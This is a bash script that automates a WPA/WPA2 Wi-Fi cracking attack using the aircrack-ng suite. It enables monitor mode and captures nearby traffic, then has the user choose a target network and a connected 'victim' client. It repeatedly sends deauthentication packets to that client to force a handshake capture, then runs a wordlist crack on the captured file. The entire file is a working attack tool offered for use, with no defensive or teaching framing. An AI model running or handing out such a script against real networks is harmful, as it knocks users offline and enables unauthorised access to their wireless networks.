#!/bin/bash -
#
#auto_attack_wpa/wpa2.
#how to find the hide essid?
#help yourself...
#
#default:wlan0, mon0
#request: aircrack suite was installed.
#
#make it in kali linux.
#
#maybe can add aircrack session function in version2.
#by needle wang
#
#version1.1:
#fixed essid inputed is none or contains blank.
#added killing aireplay-ng
#2013年 11月 02日 星期六 00:40:28 CST
#
#version1.0:
#waste one night...
#2013年 10月 30日 星期三 05:49:36 CST

test -f "$1" && test -r "$1" || {
					echo "need a wordlist file."
					echo "usage: $0 wordlist.txt"
					exit 1
				}

interface=wlan0
wordlistfile="$1"

client_inputed_validate(){
#validate if it's a number.
echo "$1" | grep -q '^[0-9]*$' || return 1
#validate if it's in a range.
if [ "$1" -gt "0" ] && [ "$1" -le "$clients_count" ]
then
	return 0
else
	return 2
fi
}

replay_for_wpa(){
#bssid
ap_mac=$1
#client_mac
victim_mac=$2

sleep 2s
while true
do
	aireplay-ng -0 2 -a $ap_mac -c $victim_mac mon0
	sleep 6s
done
}

stop_replay(){
	#here, the time of wasting equals the code's...
	#it contains:
	#a subshell's pid forked for running aireplay-ng 
	#a subshell's pid forked for running ps...
	#maybe because of $(ps)...
	#note: in some window manager (such as gnome),
	#after killing the parent pid, the sub-process's ppid could become 1~ (resolved here.)
	subshell_pid_list=$(ps -o pid --ppid $$ --sort -start_time)
	#should only one.
	subshell_pid=$(echo "$subshell_pid_list" | tail -n 1)

	sub_process_list=$(ps -o pid --ppid ${subshell_pid})
	#here is sleep's or aireplay-ng's pid
	#if not killed, the aireplay's last output would override the aircrack-ng's prompt randomly.
	sub_process_pid=$(echo "${sub_process_list}" | tail -n 1)
	kill -15 ${subshell_pid} ${sub_process_pid}
}


tmpfile=$(mktemp)
test -e $tmpfile || {
			echo "can't mktemp"
			exit 1
		    }

trap "rm -f $tmpfile; echo -e '\nterminated manually...'; exit 2;" INT

monitor_status_str=$(airmon-ng)
#if there is no monitor, start one.
#and only use mon0, maybe change it in future. ^||
echo "${monitor_status_str}" | grep -q mon0 || airmon-ng start ${interface}

echo 'Now start to capture all, if you think enough after a moment, press ctrl-c.'
read -ep 'Are you clear? [Press Enter]:'

#don't need trap...
#trap "pkill airodump-ng;" INT
airodump-ng mon0 2>&1 | tee $tmpfile

#trap "rm -f $tmpfile; echo -e '\nterminated manually...'; exit 2;" INT

line_number_at_last_elapsed=$(grep -n 'Elapsed' $tmpfile | tail -n 1 | awk -F':' '{print $1}')

#lastline are some strange characters. but I have no idea for deleting this line...
last_mesg=$(sed -n "${line_number_at_last_elapsed},\$p" $tmpfile)
echo "$last_mesg" >$tmpfile

clear
echo -e "\n------------- Final message -------------\n"
cat $tmpfile

read -ep "which ESSID you wanna crack: " essid

until [ "${essid}" ] && [ "$(sed -n '/BSSID/,/BSSID/p' $tmpfile | grep " $essid *$")" ]
do
	echo "input wrong?"
	read -ep "which ESSID you wanna crack: " essid
done


channel=$(sed -n '/BSSID/,/BSSID/p' $tmpfile | grep -- "$essid" | awk '{print $6}')
bssid=$(sed -n '/BSSID/,/BSSID/p' $tmpfile | grep -- "$essid" | awk '{print $1}')

clients=$(sed -n '/BSSID.*Probe/,$p' $tmpfile | grep -- "$bssid" | awk '{print $2}')

test "$clients" || {
			echo -e "\nno clients, you should wait a minute util a client connection."
			echo "this is the only way to wpa/wpa2."
			echo "no other tools's authority is more powerful than aircrack!"
			rm -f $tmpfile
			exit 1
		   }

clients_count=$(echo "$clients" | wc -l)
num_client=1

if [ "$clients_count" -gt 1 ]
then
	echo "It seems more clients. choose one(1,2,3...) to use for deauthentication:"
	echo "$clients" | nl
	read -ep "Enter straightly means the first: " num_client
	test "$num_client" || num_client=1
fi

if ! client_inputed_validate "$num_client"
then
	echo "I don't wannna code more. please, serious. last one chance!"
	echo "$clients" | nl
	read -ep "Enter straightly means the first: " num_client
	test "$num_client" || num_client=1
	client_inputed_validate "$num_client" || {
							echo "Are you kidding?"
							rm -f $tmpfile
							exit 38
						 }
fi

client_mac=$(echo "$clients" | sed -n "${num_client}p")

echo -e "\nmesg is here:
AP's essid   is ${essid}
AP's channel is ${channel}
AP's bssid   is ${bssid}
victim's mac is ${client_mac}\n"
read -ep "now start to dump and replay will in background.
If catched a handshake, press ctrl-c, or not, you can also press it for stop.
clear? [Press Enter]: "

trap "stop_replay;" INT
replay_for_wpa $bssid $client_mac &

airodump-ng -c $channel --bssid $bssid -w "essid_${essid}" mon0

trap "rm -f $tmpfile; echo -e '\nterminated manually...'; exit 2;" INT
clear
echo "next, crack the cap file. you can use john, hashcat... by yourself."
read -ep "here is aircrack-ng -w $wordlistfile essid_${essid}*.cap
[Press Enter]: "
aircrack-ng -w $wordlistfile "essid_${essid}"*.cap

rm -f $tmpfile

